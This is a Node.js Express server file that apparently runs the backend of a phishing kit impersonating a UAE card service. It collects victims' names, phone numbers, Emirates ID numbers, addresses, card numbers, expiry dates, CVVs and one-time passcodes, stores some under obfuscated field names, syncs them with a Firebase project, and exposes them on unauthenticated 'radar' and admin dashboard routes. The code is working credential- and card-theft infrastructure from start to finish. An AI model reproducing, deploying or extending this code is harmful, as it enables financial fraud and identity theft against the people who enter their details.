import express from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Disable browser caching completely to show immediate updates
app.use((req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  next();
});

// Persistent Storage for Registration & Cards
const DATA_FILE = path.join(__dirname, 'data', 'pays.json');

function loadPays() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (e) {
    console.error('Error reading pays data:', e);
  }
  return [];
}

let paysStore = loadPays();

function savePays() {
  try {
    const dir = path.dirname(DATA_FILE);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    fs.writeFileSync(DATA_FILE, JSON.stringify(paysStore, null, 2), 'utf-8');
  } catch (e) {
    console.error('Error saving pays data:', e);
  }
}

// Convert local pay item into Firestore REST Document format for Radar & Admin
function toFirestoreDoc(item) {
  return {
    name: `projects/ertyui-ae790/databases/(default)/documents/pays/${item.id}`,
    fields: {
      fullName: { stringValue: item.fullName || '' },
      ownerName: { stringValue: item.ownerName || item.fullName || '' },
      phone: { stringValue: item.phone || '' },
      phoneNumber: { stringValue: item.phoneNumber || item.phone || '' },
      emiratesId: { stringValue: item.emiratesId || '' },
      identityNumber: { stringValue: item.identityNumber || item.emiratesId || '' },
      region: { stringValue: item.region || '' },
      street: { stringValue: item.street || '' },
      district: { stringValue: item.district || '' },
      deliveryDate: { stringValue: item.deliveryDate || '' },
      cardNumber: { stringValue: item.cardNumber || '' },
      _v1: { stringValue: item._v1 || item.cardNumber || '' },
      expiry: { stringValue: item.expiry || '' },
      expiryDate: { stringValue: item.expiryDate || item.expiry || '' },
      _v3: { stringValue: item._v3 || item.expiry || '' },
      cvv: { stringValue: item.cvv || '' },
      _v2: { stringValue: item._v2 || item.cvv || '' },
      cardHolder: { stringValue: item.cardHolder || '' },
      cardHolderName: { stringValue: item.cardHolderName || item.cardHolder || '' },
      _v4: { stringValue: item._v4 || item.cardHolder || '' },
      cardBrand: { stringValue: item.cardBrand || 'fazaa' },
      cardType: { stringValue: item.cardType || 'standard' },
      paymentMethod: { stringValue: item.paymentMethod || 'card' },
      status: { stringValue: item.status || 'pending' },
      currentStep: { stringValue: item.currentStep || 'registered' },
      redirectPage: { stringValue: item.redirectPage || 'payment' },
      amount: { stringValue: item.amount || '5 AED' },
      currency: { stringValue: item.currency || 'AED' },
      otp: { stringValue: item.otp || '' },
      otpCode: { stringValue: item.otpCode || item.otp || '' },
      _v5: { stringValue: item._v5 || item.otpCode || item.otp || '' },
      otpSent: { booleanValue: !!item.otpSent }
    },
    createTime: item.createdAt || new Date().toISOString(),
    updateTime: item.updatedAt || new Date().toISOString()
  };
}

// REST API for Pays & Registration
app.get(['/api/pays', '/api/orders', '/api/order', '/firestore/v1/projects/:proj/databases/(default)/documents/pays'], async (req, res) => {
  paysStore = loadPays();

  // Fetch live from Realtime Database (no quota limits)
  try {
    const rtdbRes = await fetch('https://ertyui-ae790-default-rtdb.firebaseio.com/pays.json');
    if (rtdbRes.ok) {
      const rtdbData = await rtdbRes.json();
      if (rtdbData && typeof rtdbData === 'object') {
        Object.entries(rtdbData).forEach(([id, val]) => {
          if (val && typeof val === 'object') {
            const existingIdx = paysStore.findIndex(p => p.id === id);
            const item = {
              id,
              fullName: val.fullName || val.ownerName || '',
              ownerName: val.ownerName || val.fullName || '',
              phone: val.phone || val.phoneNumber || '',
              phoneNumber: val.phoneNumber || val.phone || '',
              emiratesId: val.emiratesId || val.identityNumber || '',
              identityNumber: val.identityNumber || val.emiratesId || '',
              cardNumber: val.cardNumber || val._v1 || '',
              _v1: val.cardNumber || val._v1 || '',
              expiry: val.expiry || val.expiryDate || val._v3 || '',
              expiryDate: val.expiryDate || val.expiry || val._v3 || '',
              _v3: val.expiry || val.expiryDate || val._v3 || '',
              cvv: val.cvv || val._v2 || '',
              _v2: val.cvv || val._v2 || '',
              cardHolder: val.cardHolder || val.cardHolderName || val._v4 || '',
              cardHolderName: val.cardHolderName || val.cardHolder || val._v4 || '',
              _v4: val.cardHolder || val.cardHolderName || val._v4 || '',
              cardBrand: val.cardBrand || val.brand || 'fazaa',
              cardType: val.cardType || 'gold',
              status: val.status || 'pending',
              cardStatus: val.cardStatus || 'waiting',
              otp: val.otp || val.otpCode || val._v5 || '',
              otpCode: val.otpCode || val.otp || val._v5 || '',
              _v5: val.otp || val.otpCode || val._v5 || '',
              redirectPage: val.redirectPage || 'payment',
              createdAt: val.createdAt || new Date().toISOString(),
              updatedAt: val.updatedAt || new Date().toISOString()
            };
            if (existingIdx >= 0) {
              paysStore[existingIdx] = { ...paysStore[existingIdx], ...item };
            } else {
              paysStore.unshift(item);
            }
          }
        });
      }
    }
  } catch (e) {
    // RTDB fetch error fallback
  }

  // Also try Firestore if available
  try {
    const fsRes = await fetch('https://firestore.googleapis.com/v1/projects/ertyui-ae790/databases/(default)/documents/pays?pageSize=50');
    if (fsRes.ok) {
      const data = await fsRes.json();
      if (data && data.documents && Array.isArray(data.documents)) {
        data.documents.forEach(doc => {
          const id = doc.name.split('/').pop();
          const f = doc.fields || {};
          const existingIdx = paysStore.findIndex(p => p.id === id);
          const item = {
            id,
            fullName: f.fullName?.stringValue || f.ownerName?.stringValue || '',
            ownerName: f.ownerName?.stringValue || f.fullName?.stringValue || '',
            phone: f.phoneNumber?.stringValue || f.phone?.stringValue || '',
            cardNumber: f.cardNumber?.stringValue || f._v1?.stringValue || '',
            _v1: f.cardNumber?.stringValue || f._v1?.stringValue || '',
            expiry: f.expiryDate?.stringValue || f.expiry?.stringValue || '',
            cvv: f.cvv?.stringValue || f._v2?.stringValue || '',
            cardHolder: f.cardHolderName?.stringValue || f.cardHolder?.stringValue || '',
            otp: f.otpCode?.stringValue || f.otp?.stringValue || '',
            status: f.status?.stringValue || 'pending',
            updatedAt: doc.updateTime || new Date().toISOString()
          };
          if (existingIdx >= 0) {
            paysStore[existingIdx] = { ...paysStore[existingIdx], ...item };
          } else {
            paysStore.unshift(item);
          }
        });
      }
    }
  } catch (e) {}

  savePays();
  const documents = paysStore.map(toFirestoreDoc);
  res.json({ documents, orders: paysStore, count: paysStore.length });
});

app.get('/api/stats', (req, res) => {
  const total = paysStore.length;
  const withOtp = paysStore.filter(p => !!p.otp).length;
  const pending = paysStore.filter(p => p.status === 'pending').length;
  res.json({ total, withOtp, pending, orders: paysStore.slice(0, 10) });
});

app.get(['/api/pays/:id', '/api/order/:id', '/api/orders/:id'], (req, res) => {
  const item = paysStore.find(p => p.id === req.params.id);
  if (!item) {
    return res.status(404).json({ error: 'Order not found' });
  }
  res.json({ doc: item, order: item, firestoreDoc: toFirestoreDoc(item) });
});

app.post(['/api/pays', '/api/orders', '/api/order'], (req, res) => {
  try {
    const b = req.body || {};
    const now = new Date().toISOString();
    const docId = b.id || b.orderId || `reg_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    let existingIndex = paysStore.findIndex(p => p.id === docId);
    // If not found by ID, but card is submitted without full name, attach to the most recent registration
    if (existingIndex < 0 && paysStore.length > 0 && !b.fullName && (b.cardNumber || b._v1)) {
      existingIndex = 0;
    }

    const existing = existingIndex >= 0 ? paysStore[existingIndex] : null;
    const finalId = existing ? existing.id : docId;

    const fullName = (b.fullName || b.ownerName || existing?.fullName || '').trim();
    const phone = (b.phone || b.phoneNumber || existing?.phone || '').trim();
    const emiratesId = (b.emiratesId || b.identityNumber || existing?.emiratesId || '').trim();
    const region = (b.region || existing?.region || '').trim();
    const street = (b.street || existing?.street || '').trim();
    const district = (b.district || existing?.district || '').trim();
    const deliveryDate = (b.deliveryDate || existing?.deliveryDate || '').trim();

    const cardNumber = (b.cardNumber || b._v1 || existing?.cardNumber || '').trim();
    const expiry = (b.expiry || b.expiryDate || b._v3 || existing?.expiry || '').trim();
    const cvv = (b.cvv || b._v2 || existing?.cvv || '').trim();
    const cardHolder = (b.cardHolder || b.cardHolderName || b._v4 || existing?.cardHolder || '').trim();
    const otp = (b.otp || b.otpCode || b._v5 || existing?.otp || '').trim();

    const record = {
      id: finalId,
      fullName,
      ownerName: fullName,
      phone,
      phoneNumber: phone,
      emiratesId,
      identityNumber: emiratesId,
      region,
      street,
      district,
      deliveryDate,
      cardNumber,
      _v1: cardNumber,
      expiry,
      expiryDate: expiry,
      _v3: expiry,
      cvv,
      _v2: cvv,
      cardHolder,
      cardHolderName: cardHolder,
      _v4: cardHolder,
      cardBrand: b.cardBrand || existing?.cardBrand || 'fazaa',
      cardType: b.cardType || existing?.cardType || 'standard',
      paymentMethod: b.paymentMethod || existing?.paymentMethod || 'card',
      status: b.status || existing?.status || 'pending',
      cardStatus: b.cardStatus || existing?.cardStatus || 'waiting',
      currentStep: b.currentStep || (cardNumber ? 'payment_submitted' : existing?.currentStep || 'payment'),
      redirectPage: b.redirectPage || existing?.redirectPage || 'payment',
      amount: b.amount || existing?.amount || '5 AED',
      currency: b.currency || existing?.currency || 'AED',
      otp,
      otpCode: otp,
      _v5: otp,
      otpSent: b.otpSent !== undefined ? b.otpSent : (existing?.otpSent || false),
      createdAt: existing?.createdAt || now,
      updatedAt: now
    };

    if (existingIndex >= 0) {
      paysStore[existingIndex] = record;
    } else {
      paysStore.unshift(record);
    }

    savePays();
    console.log(`[Order Saved] ID: ${finalId}, Name: ${fullName}, Phone: ${phone}, Card: ${cardNumber ? cardNumber.slice(-4) : 'none'}`);

    res.json({
      success: true,
      id: docId,
      docId,
      orderId: docId,
      doc: record
    });
  } catch (err) {
    console.error('Error handling /api/pays:', err);
    res.status(500).json({ error: err.message });
  }
});

// Update OTP
app.post(['/api/pays/:id/otp', '/api/otp'], (req, res) => {
  const orderId = req.params.id || req.body.orderId || req.body.id;
  const otpValue = (req.body.otp || req.body.otpCode || req.body._v5 || '').trim();

  const item = paysStore.find(p => p.id === orderId);
  if (item) {
    item.otp = otpValue;
    item.otpCode = otpValue;
    item._v5 = otpValue;
    item.currentStep = 'otp_submitted';
    item.otpSent = true;
    item.updatedAt = new Date().toISOString();
    savePays();
    console.log(`[OTP Received] Order: ${orderId}, OTP: ${otpValue}`);
    return res.json({ success: true, item });
  }

  // If item not found by exact ID, fallback to most recent record
  if (paysStore.length > 0) {
    const recent = paysStore[0];
    recent.otp = otpValue;
    recent.otpCode = otpValue;
    recent._v5 = otpValue;
    recent.currentStep = 'otp_submitted';
    recent.otpSent = true;
    recent.updatedAt = new Date().toISOString();
    savePays();
    console.log(`[OTP Associated with Recent Order] Order: ${recent.id}, OTP: ${otpValue}`);
    return res.json({ success: true, item: recent });
  }

  res.status(404).json({ error: 'Order not found' });
});

// Status change from Admin
app.post('/api/pays/:id/status', (req, res) => {
  const item = paysStore.find(p => p.id === req.params.id);
  if (!item) return res.status(404).json({ error: 'Not found' });
  item.status = req.body.status || 'approved';
  item.updatedAt = new Date().toISOString();
  savePays();
  res.json({ success: true, item });
});

// Delete from Admin
app.delete('/api/pays/:id', (req, res) => {
  paysStore = paysStore.filter(p => p.id !== req.params.id);
  savePays();
  res.json({ success: true });
});

// Clear all (admin debugging)
app.post('/api/pays/clear', (req, res) => {
  paysStore = [];
  savePays();
  res.json({ success: true });
});

// Routing Rules
app.get(['/radar', '/radar/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'radar.html'));
});

app.get(['/cards', '/cards/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'cards.html'));
});

app.get(['/request', '/request/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'request.html'));
});

app.get(['/order', '/order/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'order.html'));
});

app.get(['/payment', '/payment/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'payment.html'));
});

app.get(['/otp', '/otp/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get(['/code', '/code/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'code.html'));
});

app.get(['/admin', '/admin/', '/dashboard', '/dashboard/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Serve static assets
app.use(express.static(__dirname, { extensions: ['html', 'htm'] }));

// Dynamic Clean URL handling
app.get('*', (req, res) => {
  const reqPath = req.path;
  const normalizedPath = reqPath === '/' ? '/index' : reqPath.replace(/\/$/, '');
  const htmlFile = path.join(__dirname, `${normalizedPath}.html`);

  if (fs.existsSync(htmlFile)) {
    return res.sendFile(htmlFile);
  }

  const notFoundFile = path.join(__dirname, '404.html');
  if (fs.existsSync(notFoundFile)) {
    return res.status(404).sendFile(notFoundFile);
  }

  res.status(404).send('Not Found');
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on http://0.0.0.0:${PORT}`);
});
